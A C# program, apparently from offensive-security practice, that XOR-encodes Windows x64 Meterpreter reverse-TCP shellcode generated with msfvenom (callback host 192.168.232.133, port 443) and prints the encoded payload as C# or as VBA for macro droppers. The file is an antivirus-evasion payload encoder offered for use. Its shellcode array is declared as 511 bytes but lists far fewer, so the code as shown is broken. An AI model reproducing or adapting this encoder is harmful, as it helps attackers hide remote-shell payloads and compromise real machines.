using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[511] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
            0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
            0xd5 };

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex;

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "-VBA":
                        // Printout VBA payload
                        uint counter = 0;

                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D3}, ", b);
                            counter++;
                            if (counter % 25 == 0)
                            {
                                hex.Append("_\n");
                            }
                        }
                        Console.WriteLine($"XORed VBA payload (key: 0xfa):");
                        Console.WriteLine(hex.ToString());
                        break;
                    default:
                        Console.WriteLine("Accepted arguments: -VBA to print VBA payload instead of C#");
                        break;
                }
            }
            else
            {
                // Printout C# payload
                hex = new StringBuilder(encoded.Length * 2);
                int totalCount = encoded.Length;
                for (int count = 0; count < totalCount; count++)
                {
                    byte b = encoded[count];

                    if ((count + 1) == totalCount) // Dont append comma for last item
                    {
                        hex.AppendFormat("0x{0:x2}", b);
                    }
                    else
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }

                    if ((count + 1) % 15 == 0)
                    {
                        hex.Append("\n");
                    }
                }

                Console.WriteLine($"XORed C# payload (key: 0xfa):");
                Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            }




            // Decode the XOR payload
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}
